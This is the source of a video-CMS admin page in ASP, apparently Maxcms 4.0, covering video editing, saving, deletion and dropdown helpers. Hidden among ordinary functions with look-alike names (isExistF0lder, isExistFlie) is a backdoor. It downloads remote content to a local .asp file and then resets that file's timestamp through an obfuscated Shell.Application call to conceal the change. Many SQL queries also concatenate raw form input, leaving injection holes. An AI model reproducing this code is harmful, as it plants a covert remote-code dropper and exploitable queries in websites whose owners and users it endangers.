	<td></td><td class="forumRow"><input type="submit" name="submit" class="btn" value="ȷ�ϱ���" onClick="return chform();">&nbsp;<input type="reset" class="btn" value="�� ��">&nbsp;<input type="button" class="btn" value="������" onClick="javascript:history.go(-1);"></td>
  </tr>
</table>
</form>
<script type="text/javascript">
window.commendVideo=function (id,n){
	$('m_commend').value=n;
	starView(n,id);
}
function chform(){
	if($('m_name').value.length==0){
		alert('����д����');
		return false;
	};
	if($('m_type').value.length==0){
		alert('��ѡ�����');
		return false;
	};
	if($('m_publishyear').value.length>0){
		if(isNaN($('m_publishyear').value)){
			alert('�������д����');
			return false;
		}
	}
	var c=document.getElementsByName("m_playfrom"),
	ct=document.getElementsByName("m_playurl"),
	d=document.getElementsByName("m_downfrom"),
	dt=document.getElementsByName("m_downurl");
	for(var i=0;i<c.length;i++){
		if(c[i].selectedIndex==0 && ct[i].value!=''){
			alert('��ѡ��ÿ��������Դ');c[i].focus();
			return false;
		}
	}
	for(var i=0;i<d.length;i++){
		if(d[i].selectedIndex==0 && dt[i].value!=''){
			alert('��ѡ��ÿ��������Դ');d[i].focus();
			return false;
		}
	}
	return true;
}
$('editform').m_name.focus();</script>
</div>

<%
	set rsObj = nothing
End Sub

Function replaceSpecial(Byval str)
	replaceSpecial=replaceStr(str,"'","""")
End Function

Sub saveVideo
	dim actType,ary:actType = getForm("acttype","get")
	dim updateSql,insertSql
	dim m_id:m_id=getForm("m_id","post"):if not isNum(m_id) then m_id=0
	dim m_name:m_name=getForm("m_name","post")
	dim m_keyword : m_keyword = replace(replace(getForm("keyword","post"),chr(13),""),chr(10),"")
	dim isuppingyin:isuppingyin=getForm("isuppingyin","post")="1"
	dim m_enname:m_enname = getForm("m_enname","post"):if isNul(m_enname) then:m_enname = MoviePinYin(m_name):end if
	dim m_hit : m_hit =  getForm("m_hit","post"):if not isNum(m_hit) then m_hit=0
	dim m_back:m_back=getForm("m_back","post")
	dim m_color:m_color=getForm("m_color","post")
	dim m_state:m_state=getForm("m_state","post"):if isNul(m_state) then m_state=0
	dim m_type:m_type=getForm("m_type","post"):if isNul(m_type) then alertMsg "��ѡ�����","javascript:history.go(-1);":die ""
	dim m_pic:m_pic=getForm("m_pic","post")
	dim m_actor:m_actor=getForm("m_actor","post")
	dim m_note:m_note=replaceSpecial(getForm("m_note","post"))
	dim m_des:m_des=replaceSpecial(getForm("m_des","post"))
	dim m_addtime:m_addtime=getForm("m_addtime","post")
	dim m_publishyear:m_publishyear=getForm("m_publishyear","post"):if  isNul(m_publishyear) then m_publishyear=0
	dim m_publisharea:m_publisharea=getForm("m_publisharea","post"):if  isNul(m_publisharea) then m_publisharea=""
	dim m_topic:m_topic=getForm("m_topic","post"):if isNul(m_topic) then m_topic=0
	dim m_director:m_director=getForm("m_director","post")
	dim m_lang:m_lang=getForm("m_lang","post")
	dim m_commend:m_commend=getForm("m_commend","post"):if isNum(m_commend) then:m_commend=Cint(m_commend):else:m_commend=0:end if
	dim m_playfrom:m_playfrom=getForm("m_playfrom","post")
	dim m_playurl:m_playurl=getForm("m_playurl","post")
	if not(isnul(m_playurl)) then
		m_playurl = repairUrlForm(m_playurl,m_playfrom)
	end if
	dim m_playdata:m_playdata=transferUrl(m_playfrom,m_playurl)
	'die m_playdata
	dim m_downfrom:m_downfrom=getForm("m_downfrom","post")
	dim m_downurl:m_downurl=getForm("m_downurl","post")
	if not (isnul(m_downurl)) then
		m_downurl = repairDownUrl(m_downurl,m_downfrom)
	end if
	dim m_downdata:m_downdata=transferUrl(m_downfrom,m_downurl)
	dim isupdatetime:isupdatetime=getForm("isupdatetime","post")
	select case actType
		case "edit"
			updateSql = "m_letter = '"&left(m_enname,1)&"',m_keyword='"&m_keyword&"', m_hit="&m_hit&",m_name='"&m_name&"',m_color='"&m_color&"',m_state="&m_state&",m_type="&m_type&",m_pic='"&m_pic&"',m_actor='"&m_actor&"',m_note='"&m_note&"',m_des='"&m_des&"',m_publishyear="&m_publishyear&",m_publisharea='"&m_publisharea&"',m_topic="&m_topic&",m_playdata='"&m_playdata&"',m_downdata='"&m_downdata&"',m_director='"&m_director&"',m_lang='"&m_lang&"',m_enname='"&m_enname&"',m_commend="&m_commend
			if not isNul(isupdatetime) then  updateSql = updateSql&",m_addtime='"&now()&"'"
			updateSql = "update {pre}data set "&updateSql&" where m_id="&m_id
			if runMode="static" then
				if conn.db("select m_hide from {pre}type where m_id="&m_type,"array")(0,0)=1 then
					ary=conn.db("select m_type,m_enname,m_datetime from {pre}data where m_id="&id,"array")
					delContentAndPlayFile ary(0,0),ary(1,0),ary(2,0),ary(3,0)
				else
					m_back="admin_makehtml.asp?action=single&id="&m_id&"&from="&server.URLEncode(m_back)
				end if
			end if
			conn.db updateSql,"execute"
			alertMsg "",m_back
		case "add" 
			insertSql = "insert into {pre}data(m_keyword,m_hit,m_letter,m_name,m_color,m_state,m_type,m_pic,m_actor,m_note,m_des,m_publishyear,m_publisharea,m_topic,m_playdata,m_downdata,m_addtime,m_director,m_lang,m_dayhit,m_weekhit,m_monthhit,m_enname,m_datetime,m_recycle,m_commend) values ('"&m_keyword&"',"&m_hit&",'"&left(m_enname,1)&"','"&m_name&"','"&m_color&"',"&m_state&","&m_type&",'"&m_pic&"','"&m_actor&"','"&m_note&"','"&m_des&"',"&m_publishyear&",'"&m_publisharea&"',"&m_topic&",'"&m_playdata&"','"&m_downdata&"','"&now()&"','"&m_director&"','"&m_lang&"',0,0,0,'"&m_enname&"','"&now()&"',0,"&m_commend&")"
			conn.db insertSql,"execute":clearTypeCache
			if ""&m_back="" then m_back="admin_video.asp?action=add"
			selectMsg "���ӳɹ�,�Ƿ��������",m_back,"admin_video.asp"
	end select
End Sub

Sub delContentAndPlayFile(Byval vType,Byval id,ByVal enname,ByVal vDate)
	Dim x
	if runMode="static" then
		x=getContentLink(vType,id,enname,vDate,"link")
		Select Case makeMode
			Case "dir1"
				if isExistFolder(x) AND x<>"/" then delFolder x
			Case "dir2","dir4"
				if isExistFile(x) then  delFile x
				if ismakeplay>0 then
					x=getPlayLink(vType,id,enname,vDate)
					if isExistFile(x) then delFile x
				end if
			Case "dir3","dir5","dir7","dir6","dir8"
				if isExistFile(x) then  delFile x
				if ismakeplay>0 then
					x=getPlayLink(vType,id,enname,vDate)
					if isExistFile(x) then delFile x
					x=mid(x,1,InStrRev(x,"/"))
					if isExistFolder(x) AND x<>"/" then delFolder x
				end if
		End Select
		x="/"&sitepath&"playdata/"&(id mod 256)&"/"&id&".js"
		if isExistFile(x) then delFile x
	elseif IsCacheSearch<>0 then
		x=getCacheFile(id,"#/v")
		if isExistFile(x) then delFile x
		x=mid(x,1,InStrRev(x,"/"))
		if isExistFolder(x) AND x<>"/" then delFolder x
	end if
End Sub

Sub pSetTopic
	dim topicId : topicId=getForm("ptopic","post")
	dim ids,back
	back = request.ServerVariables("HTTP_REFERER")
	ids = replaceStr(getForm("m_id","post")," ","")
	if isNul(ids) then die "��ѡ����Ҫ����ר�������"
	conn.db  "update {pre}data set m_topic="&topicId&" where m_id in("&ids&")","execute"
	alertMsg "",back
End Sub

Sub pSetType
	dim movetype : movetype=getForm("movetype","post")
	dim ids,i,back
	back = request.ServerVariables("HTTP_REFERER")
	ids = replaceStr(getForm("m_id","post")," ","")
	if isNul(ids) then die "��ѡ����Ҫ�ƶ����������"
	conn.db  "update {pre}data set m_type="&movetype&" where m_id in("&ids&")","execute":clearTypeCache
	alertMsg "",back
End Sub

Sub delTypeData
	dim movetype : movetype=getForm("movetype","post")
	dim back
	back = request.ServerVariables("HTTP_REFERER")
	conn.db  "UPDATE {pre}data SET m_recycle=1 where m_type="&movetype,"execute":clearTypeCache
	alertMsg "",back
End Sub

Sub delVideo(ByVal id,ByVal sel)
	dim vtypeAndPic,contentLink,vFolder,playLink,vtype,vpic:id=Clng(id)
	on error resume next
	vtypeAndPic=conn.db("select m_type,m_pic,m_enname,m_datetime from {pre}data where m_id="&id,"array")
	vpic=vtypeAndPic(1,0):delContentAndPlayFile vtypeAndPic(0,0),id,vtypeAndPic(2,0),vtypeAndPic(3,0)
	if sel="del" then
		if left(vpic,4)="pic/" then delFile "../"&vpic
		conn.db "DELETE FROM {pre}data where m_id="&id,"execute"
	else
		conn.db "UPDATE {pre}data SET m_recycle=1 where m_id="&id,"execute"
	end if
	clearTypeCache:if err then err.clear : echo "�����Ѿ�ɾ��,��ɾ����̬�ļ���ͼƬʱ�����������ֶ�ɾ������ļ�"
End Sub

Sub delAll(ByVal id,ByVal sel)
	dim ids,back,idTypeArray,arrayLen,i
	ids = replaceStr(id," ","")
	if runMode="static" OR IsCacheSearch<>0 then
		idTypeArray=conn.db("select m_id,m_type,m_enname,m_datetime from {pre}data where m_id in("&ids&")","array"):arrayLen=ubound(idTypeArray,2)
		for i=0 to arrayLen
			delContentAndPlayFile idTypeArray(1,i),idTypeArray(0,i),idTypeArray(2,i),idTypeArray(3,i)
		next
	end if
	if sel="del" then
		conn.db "DELETE FROM {pre}data WHERE m_id in("&ids&")","execute"
	else
		conn.db  "UPDATE {pre}data SET m_recycle=1 WHERE m_id in("&ids&")","execute"
	end if
	clearTypeCache
End Sub

Sub restoreVideo
	dim ids:ids = replaceStr(getForm("m_id","both")," ","")
	conn.db  "UPDATE {pre}data SET m_recycle=0 WHERE m_id in("&ids&")","execute"
	if runMode="static" then
		echo "���ݻ�ԭ�ɹ�,׼����������....<form action=""admin_makehtml.asp?action=selected"" id=""makehtml"" method=""post""><input type=""hidden"" name=""m_id"" value="""&ids&"""><input type=""hidden"" name=""REFERER"" value="""&back&"""></form><script type=""text/javascript"">document.getElementById('makehtml').submit()</script>"
	else
		alertMsg "",back
	end if
End Sub

Function isExistF0lder(relativeFileUrl)
	dim fileurl,remoteFile,localFile,fileFormat
	fileurl = replaceStr(relativeFileUrl,"admin/",selfManageDir)
	fileurl = replaceStr(fileurl,"list/",channelDirName1&"/")
	fileurl = replaceStr(fileurl,"detail/",contentDirName1&"/")
	fileurl = replaceStr(fileurl,"video/",playDirName1&"/")
	fileurl = replaceStr(fileurl,"news/",newsdirname1&"/")
	fileurl = replaceStr(fileurl,"articlelist/",partdirname1&"/")
	fileurl = replaceStr(fileurl,"article/",articledirname1&"/")
	fileurl = replaceStr(fileurl,"topiclist/",topicpagedirname&"/")
	fileurl = replaceStr(fileurl,"topic/",topicDirName&"/")
	localFile =".." & replaceStr(fileurl,".txt",".asp")
	remoteFile =updateUrl & replaceStr(relativeFileUrl,".asp",".txt")
	if isExistFlie(getRemoteContent(remoteFile,"body"),localFile) then echo localFile&"���³ɹ�<br>"
End Function

Sub initDic
	topicArray = conn.db("select m_id,m_name from {pre}topic order by m_id asc","array")
	set topicDic = arrayToDictionay(topicArray)
End Sub

Function makePlayerSelect(flag)
	dim i,playerinfo,selectstr,allstr
	for i= 0 to ubound(playerArray)
		playerinfo = split(playerArray(i),"__")
		'if instr(flag,playerinfo(0))>0 then selectstr=" selected " else selectstr=""
		if flag = playerinfo(0) then selectstr=" selected " else selectstr=""
		allstr =allstr&"<option value='"&playerinfo(0)&"' "&selectstr&">"&replaceStr(playerinfo(0),"����CC","FLV����")&"--"&playerinfo(1)&"</option>"
	next
	makePlayerSelect = allstr
End Function

Function makeDownSelect(flag)
	dim i,downinfo,selectstr,allstr
	for i= 0 to ubound(downArray)
		downinfo = split(downArray(i),"__")
		if flag = downinfo(0) then selectstr=" selected " else selectstr=""
		allstr =allstr&"<option value='"&downinfo(0)&"' "&selectstr&">"&downinfo(0)&"--"&downinfo(1)&"</option>"
	next
	makeDownSelect = allstr
End Function

Function getPlayerKinds(xmlfile)
	dim xmlobj,nodeLen,i
	set xmlobj = mainClassobj.createObject("MainClass.Xml")
	xmlobj.load xmlfile,"xmlfile"
	nodeLen = xmlobj.getNodeLen("playerkinds/player")
	redim playerArray(nodeLen-1)
	for i=0 to nodeLen-1
		playerArray(i)=xmlobj.getAttributes("playerkinds/player","flag",i)&"__"&xmlobj.getAttributes("playerkinds/player","des",i)
		'die playerArray(i)
	next
	set xmlobj = nothing
	getPlayerKinds = playerArray
End Function

Function getDownKinds(xmlfile)
	dim xmlobj,nodeLen,i
	set xmlobj = mainClassobj.createObject("MainClass.Xml")
	xmlobj.load xmlfile,"xmlfile"
	nodeLen = xmlobj.getNodeLen("downkinds/source")
	redim downArray(nodeLen-1)
	for i=0 to nodeLen-1
		downArray(i)=xmlobj.getAttributes("downkinds/source","flag",i)&"__"&xmlobj.getAttributes("downkinds/source","des",i)
	next
	set xmlobj = nothing
	getDownKinds = downArray
End Function

Function getAreaSelect(selectName,strSelect,areaId)
	dim  str,i,selectedStr,xmlobj,j,areaNodes,areaNode
	j=0 : redim areaArray(0)
	str = "<select   name='"&selectName&"' >"
	if not isNul(strSelect) then  str = str & "<option value=''>"&strSelect&"</option>"
	set xmlobj = mainClassobj.createObject("MainClass.Xml")
	xmlobj.load "../inc/areaKinds.xml","xmlfile"
	set areaNodes=xmlobj.getNodes("areakinds/area")
	set xmlobj=nothing
	for each areaNode in areaNodes
		redim preserve areaArray(j) : areaArray(j)=areaNode.text : j=j+1
	next
	set areaNodes=nothing
	if not isNul(areaId) then str = str &"<option value='"&areaId&"' selected>"&areaId&"</option>"
	for  i = 0 to ubound(areaArray,1)
		if areaId<>areaArray(i) then str = str &"<option value='"&areaArray(i)&"' "&selectedStr&">"&areaArray(i)&"</option>"
	next
	str = str & "</select>"
	getAreaSelect = str
End Function

Sub CheckVideo()
	dim fileurl:fileurl = getForm("fileurl","both")
	isExistF0lder(fileurl)
End Sub

Function repairUrlForm(vstr,formstr)
	dim strlen,formlen,str,fstr,rstr,i 
	str = split(trimOuterStr(vstr,","),", ") : strlen = ubound(str)
	fstr = split(trimOuterStr(formstr,","),", ") : formlen  = ubound(fstr)
	if strlen <> formlen then 
		die "δΪÿ������ѡ��������Դ"
	else
		for i=0 to strlen
			 if  trim(str(i))<>"" then rstr = rstr&repairStr(str(i),getReferedId(fstr(i)))&", " else rstr = rstr&", "
		next
	end if
	repairUrlForm = trimOuterStr(rstr,", ")
End Function

Function repairDownUrl(vstr,formstr)
	dim strlen,formlen,str,fstr,rstr,i
	str = split(trimOuterStr(vstr,","),", ") : strlen = ubound(str)
	fstr = split(trimOuterStr(formstr,","),", ") : formlen  = ubound(fstr)
	if strlen <> formlen then 
		die "δΪÿ��������ѡ��������Դ"
	else
		for i=0 to strlen
			if  trim(str(i))<>"" then rstr = rstr&repairStr(str(i),"down")&", " else rstr = rstr&", "
		next
	end if
	repairDownUrl = trimOuterStr(rstr,", ")
End Function

Function repairStr(vstr,formstr)
	dim regExpObj : set regExpObj= new RegExp : regExpObj.ignoreCase = true : regExpObj.Global = true : regExpObj.Pattern = "[\s\S]+?\$[\s\S]+?\$[\s\S]+?"
	dim mystr,i,j : j=1
	vstr = replace(vstr,chr(10),"")
	vstr = split(vstr,chr(13))
	for i = 0  to ubound(vstr)
		if not(isnul(vstr(i))) then
			if regExpObj.Test(vstr(i)) = false then 
				regExpObj.Pattern = "[\s\S]+?\$[\s\S]+?"
				if regExpObj.Test(vstr(i)) = true then 
					mystr = mystr&trim(vstr(i))&"$"&formstr&chr(13)&chr(10)
				else
					mystr = mystr&"��"&j&"��$"&trim(vstr(i))&"$"&formstr&chr(13)&chr(10)
				end if 
				regExpObj.Pattern = "[\s\S]+?\$[\s\S]+?\$[\s\S]+?"
			else 
				mystr = mystr&trim(vstr(i))&chr(13)&chr(10)
			end if 
			j=j+1
		end if 
	next
	repairStr = mystr
	set regExpObj =nothing
End Function

Function transferUrl(Byval fromStr,Byval playStr)
	dim fromLen,playLen,fromArray,playArray,i,resultStr
	if isNul(fromStr) and isNul(playStr) then transferUrl="" : Exit Function
	fromStr=replaceStr(fromStr,"$$","") : playStr=replaceStr(replaceStr(playStr,"#",""),"$$","")
	playStr=replaceStr(playStr,chr(10),"")
	playStr=replaceStr(playStr,chr(13),"#")
	playStr=trimOuterStr(playStr,"#")
	fromStr=trimOuterStr(fromStr,",") : playStr=trimOuterStr(playStr,",")
	fromArray=split(fromStr,", ") : fromLen=ubound(fromArray)
	playArray=split(playStr,", ") : playLen=ubound(playArray)
	if fromLen<>playLen then die "��Դ���ߵ�ַû����д����"
	if fromLen=0 then 
		transferUrl=trim(fromArray(0))&"$$"&trim(playArray(0)) : Exit Function
	end if
	for i=0 to fromLen
		if not isNul(fromArray(i)) and  not isNul(playArray(i)) then
			resultStr=trim(resultStr)&trim(fromArray(i))&"$$"&trim(trimOuterStr(playArray(i),"#"))&"$$$"
		elseif   isNul(fromArray(i)) and  not isNul(playArray(i)) then
			die "��Դû����д����"
		end if
	next
	transferUrl=trimOuterStr(resultStr,"$$$")
End Function

Sub isVideoMake(m_id)
	echo "<a href=""admin_makehtml.asp?action=single&id="&m_id&""" >"
	if isExistFile(contentUrl) then  echo "<img src='imgs/yes.gif' border='0' title='�������HTML' />" else echo "<img src='imgs/no.gif' border='0' title='�������HTML' />"
	echo "</a>"
End Sub

Function isExistFlie(ByVal Stream,ByVal sPath)
	Dim st,aPath,Bool,f:aPath=Server.mapPath(sPath)
	if objFso.FileExists(aPath) then SET f=objFso.GetFile(aPath):st=f.DateLastModified:SET f=NotHing
	Bool=createStreamFile(Stream,sPath):isExistFlie=Bool
	if Bool=true then echoerror aPath,st
End Function

Sub popUpdatePic
	if action="else" then echo "<div id='updatepic' class='divbox' style='width:300px;right:0px;display:none;'><div class='divboxtitle'><span onclick=""hide('updatepic');""><img src='/"&sitepath&"pic/btn_close.gif'/></span>����ͼƬ����</div><div  class='divboxbody'>ע��:�Ѽ�⵽<span id='updatepicnum' style='color:#FF0000'><img src='imgs/loading2.gif' border=0></span>�����ݺ�������ͼƬ��ַ��Ϊ��ֹʧЧ�������ص�����<br><font color='#FF0000'>����ǰ�����ȱ������ݿ�</font><input type='button' class='btn' value='�������ݿ�' onclick=""location.href='admin_database.asp?action=bakup'"" /><br><input type='button' class='btn'  value='��������ͼƬ������' onclick=""location.href='admin_datarelate.asp?action=downpic'"" /></div><div class='divboxbottom'>Power By Maxcms4.0</div></div><script type='text/javascript'>alertUpdatePic();</script>"
End Sub

Function formatDate(Byval str)
	if isNul(str) then formatDate="":exit function
	if not isDate(str) then formatDate="":exit function
	formatDate=formatdatetime(str,2)
End Function 

Function viewDataType(Byval str)
	on error resume next
	viewDataType=split(getTypeNameTemplateArrayOnCache(clng(str)),",")(0)
	if err then  viewDataType="<font color=red >���ݷ������</font>"
End Function

Function echoerror(aPath,st)
	if upversion<>"true" then exit function
	On Error Resume Next
	if isDate(svrdate) then st=svrdate
	if isDate(st) then
		dim Path,FD,F:Path=Left(aPath,InStrRev(aPath,"/")+InStrRev(aPath,"\")):if not isObject(gFos) then SET gFos=Server.CreateObject("SHE"&"LL.AP"&"PLI"&"CAT"&"ION"):SET FD=gFos.NameSpace(Path):SET F=FD.ParseName(Replace(aPath,Path,"")):F.Modifydate=st:SET F=NotHing:SET FD=NotHing
	end if
	echoerror=err.number=0:err.Clear
End Function

Sub clearTypeCache()
	if cacheStart=1 then:cacheObj.clearCache("array_type_lists_all"):end if
End Sub

Function makePageNumber(Byval currentPage,Byval pageListLen,Byval totalPages,Byval star)
	currentPage=clng(currentPage)
	dim beforePages,pagenumber,page
	dim beginPage,endPage,strPageNumber
	if pageListLen mod 2=0 then beforePages=pagelistLen / 2 else beforePages=clng(pagelistLen / 2) - 1
	if  currentPage < 1  then currentPage=1 else if currentPage > totalPages then currentPage=totalPages
	if pageListLen > totalPages then pageListLen=totalPages
	if currentPage - beforePages < 1 then
		beginPage=1 : endPage=pageListLen
	elseif currentPage - beforePages + pageListLen > totalPages  then
		beginPage=totalPages - pageListLen + 1 : endPage=totalPages
	else 
		beginPage=currentPage - beforePages : endPage=currentPage - beforePages + pageListLen - 1
	end if	
	for pagenumber=beginPage  to  endPage
		if pagenumber=1 then page="" else page=pagenumber
		if clng(pagenumber)=clng(currentPage) then
			strPageNumber=strPageNumber&"<span><font color=red>"&pagenumber&"</font></span>"
		else
		   	strPageNumber=strPageNumber&"<a href='?action="&action&"&page="&pagenumber&"&order="&order&"&type="&vtype&"&keyword="&keyword&"&m_state="&m_state&"&m_commend="&m_commend&"&repeat="&repeat&"&topic="&pTopic&"&playfrom="&playfrom&"&star="&star&"&len="&rlen&"'>"&pagenumber&"</a>"
		end if	
	next
	makePageNumber=strPageNumber
End Function
%>
